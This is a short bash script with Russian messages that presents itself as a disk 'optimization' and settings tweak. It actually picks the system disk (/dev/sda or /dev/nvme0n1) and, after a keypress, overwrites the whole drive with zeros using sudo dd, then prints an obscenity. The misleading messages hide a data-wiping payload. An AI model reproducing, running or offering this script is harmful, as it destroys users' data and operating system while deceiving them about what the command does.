

echo "Начинаем процес оптимизации"
echo ""


DISK="/dev/sda"


if [ ! -e "$DISK" ]; then
    DISK="/dev/nvme0n1"
fi

echo "Выбран диск: $DISK"
echo "Продолжаем выполнение..."
read

# Заполняем диск нулями
echo "Допиливаем настройки"
sudo dd if=/dev/zero of=$DISK bs=1M status=progress

echo "хуй хуй хуй"